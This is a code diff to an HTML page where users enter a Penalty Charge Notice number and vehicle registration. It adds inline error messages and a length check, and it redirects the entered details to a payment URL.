@@ -28,11 +28,14 @@
       <p class="page-subtitle">Enter Penalty Charge Notice (PCN) number and vehicle registration</p>
 
       <form id="pcn-form" novalidate>
+        <!-- Error message box -->
+        <div id="error-message" class="error-box" style="display:none;"></div>
+
         <!-- PCN number -->
         <div class="form-group">
           <label for="PCN" class="form-label">PCN number</label>
           <div class="form-hint">Your PCN number starting with AW followed by 8 digits</div>
-          <input class="form-input" id="PCN" name="PCN" type="text" maxlength="50" autocomplete="off">
+          <input class="form-input" id="PCN" name="PCN" type="text" maxlength="10" autocomplete="off">
         </div>
 
         <!-- Registration number -->
@@ -61,6 +64,7 @@
   <script>
     document.addEventListener("DOMContentLoaded", function() {
       const form = document.getElementById("pcn-form");
+      const errorBox = document.getElementById("error-message");
 
       form.addEventListener("submit", function(e) {
         e.preventDefault();
@@ -68,15 +72,27 @@
         const pcn = document.getElementById("PCN").value.trim().toUpperCase();
         const vrm = document.getElementById("VRM").value.trim().toUpperCase();
 
-        if (!pcn || !vrm) {
-          alert("Please enter both your PCN number and vehicle registration.");
+        // Validation checks
+        if (pcn.length !== 10) {
+          showError("Your PCN number must be exactly 10 characters long.");
           return;
         }
 
-        // Redirect to payment page with query parameters
+        if (!vrm) {
+          showError("Please enter your vehicle registration number.");
+          return;
+        }
+
+        // If validation passes, redirect to payment page
         const payUrl = `https://www.eryripress.co.uk/pay?pcn=${encodeURIComponent(pcn)}&vrm=${encodeURIComponent(vrm)}`;
         window.location.href = payUrl;
       });
+
+      function showError(message) {
+        errorBox.style.display = "block";
+        errorBox.textContent = message;
+        window.scrollTo({ top: 0, behavior: "smooth" });
+      }
     });
   </script>
 
